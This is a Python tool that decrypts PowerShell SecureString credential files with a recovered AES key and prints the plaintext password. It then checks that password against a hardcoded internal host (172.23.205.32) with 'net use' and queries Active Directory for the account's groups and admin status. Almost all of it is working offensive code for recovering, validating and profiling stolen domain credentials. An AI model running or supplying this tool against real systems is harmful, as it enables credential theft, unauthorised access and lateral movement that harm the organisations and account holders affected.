#!/usr/bin/env python3
"""
Decrypt PowerShell SecureString encrypted with AES key
Reads aeskey.txt and Cred.txt from SMB share via asmbclient or local files
"""
import base64, binascii, sys, os, subprocess

def decrypt_securestring(enc_string, key_bytes):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    data = enc_string.strip()[32:]
    while len(data) % 4 != 0:
        data += '='
    raw = base64.b64decode(data)
    text = raw.decode('utf-16-le')
    parts = text.split('|')
    iv = base64.b64decode(parts[1])
    ct = binascii.unhexlify(parts[2])
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv))
    dec = cipher.decryptor()
    pt = dec.update(ct) + dec.finalize()
    return pt.decode('utf-16-le').rstrip('\x00').strip()

def main():
    if len(sys.argv) < 3:
        print("Usage: decrypt.py <aeskey_file> <cred_file> [username] [domain]")
        print("   or: decrypt.py --smb <smb_url> <remote_dir> [username] [domain]")
        sys.exit(1)

    if sys.argv[1] == '--smb':
        print("[!] SMB mode not yet implemented, use local files")
        sys.exit(1)

    keyfile = sys.argv[1]
    credfile = sys.argv[2]
    username = sys.argv[3] if len(sys.argv) > 3 else 'UNKNOWN'
    domain = sys.argv[4] if len(sys.argv) > 4 else ''

    # Read AES key
    with open(keyfile, 'r') as f:
        key_values = [int(line.strip()) for line in f if line.strip().isdigit()]
    key = bytes(key_values)
    print(f"[*] AES key: {len(key)} bytes ({len(key)*8}-bit)")

    # Read encrypted credential
    with open(credfile, 'r') as f:
        enc = f.read().strip()
    print(f"[*] Encrypted string: {len(enc)} chars")

    # Decrypt
    try:
        password = decrypt_securestring(enc, key)
        print(f"[+] DECRYPTED!")
        print(f"    Username: {username}")
        print(f"    Domain:   {domain}")
        print(f"    Password: {password}")
        print(f"    Password repr: {repr(password)}")
        print(f"    Password hex: {password.encode('utf-8').hex()}")

        # Validate credential
        if domain and os.name == 'nt':
            print(f"\n[*] Validating credential...")
            r = subprocess.run(
                ['net', 'use', '\\\\172.23.205.32\\IPC$', f'/user:{domain}\\{username}', password],
                capture_output=True, text=True
            )
            if 'successfully' in r.stdout.lower():
                print(f"[+] CREDENTIAL VALID!")
                subprocess.run(['net', 'use', '\\\\172.23.205.32\\IPC$', '/delete', '/y'],
                    capture_output=True)
            else:
                print(f"[-] Validation failed: {r.stderr.strip()}")

            # Check account info
            print(f"\n[*] Account info:")
            r2 = subprocess.run(
                ['powershell', '-c',
                 f"$r=([adsisearcher]'(samaccountname={username})').FindOne();"
                 f"Write-Host 'Groups:' $r.Properties.memberof;"
                 f"Write-Host 'UAC:' $r.Properties.useraccountcontrol[0];"
                 f"Write-Host 'Desc:' $r.Properties.description[0];"
                 f"Write-Host 'AdminCount:' $r.Properties.admincount[0]"],
                capture_output=True, text=True
            )
            print(r2.stdout)

    except Exception as e:
        print(f"[-] Decryption failed: {e}")

if __name__ == '__main__':
    main()
